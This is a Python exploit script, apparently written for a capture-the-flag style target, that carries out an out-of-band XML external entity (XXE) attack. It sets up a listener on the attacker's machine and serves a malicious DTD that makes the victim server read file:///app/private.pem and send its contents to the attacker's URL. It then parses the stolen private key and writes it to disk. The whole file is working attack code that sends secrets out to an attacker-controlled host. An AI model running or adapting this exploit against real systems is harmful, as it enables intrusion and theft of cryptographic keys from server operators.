import socket
import subprocess

from urllib.parse import unquote


def parse_private_key_from_xxe_payload(request_with_payload):
    part_of_request = request_with_payload[8:]
    url_encoded_pk = part_of_request[:part_of_request.find("HTTP") - 1]
    pk = unquote(url_encoded_pk)
    return pk


def handle_xxe(our_port, our_ip, victim_url):
    our_url = f"http://{our_ip}:{our_port}"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((our_ip, our_port))
    s.listen(1)

    # we should send xml and in parallel send external entity for our xml for the request from server processing our xml
    subprocess.Popen(["python", "import_xml.py", our_url, victim_url])

    conn, _ = s.accept()
    data = conn.recv(1000)  # server wants to now entity %xxe
    if not data:
        raise Exception("No data from XXE")

    payload = '<!ENTITY % payl SYSTEM "file:///app/private.pem">' + \
              f'<!ENTITY % int "<!ENTITY send SYSTEM \'{our_url}?p=%payl;\'>">\r\n'

    head = "HTTP/1.0 200 OK\r\n" \
           "Content-Type: text/plain; charset=UTF-8\r\n" \
           f"Content-Length: {len(payload)}\r\n\r\n"

    conn.send((head + payload).encode('utf8'))

    conn, _ = s.accept()
    data = conn.recv(5000)  # server process entity &send and send request '{our_url}?p=%payl'
    if not data:
        raise Exception("No data from XXE")

    head = "HTTP/1.0 200 OK\r\n" \
           "Content-Type: text/plain; charset=UTF-8\r\n" \
           f"Content-Length: {len('nikakoi_ne_secretik')}\r\n\r\n"

    conn.send(head.encode('utf8') + b"nikakoi_ne_secretik\r\n")
    conn.close()

    private_key = parse_private_key_from_xxe_payload(data.decode('utf8'))
    return private_key


def stole_private_key(our_ip, our_port, victim_url):
    private_key = handle_xxe(our_port, our_ip, victim_url)
    print('[+] Steal private key')
    with open('private.pem', 'w') as f:
        f.write(private_key)
    return private_key
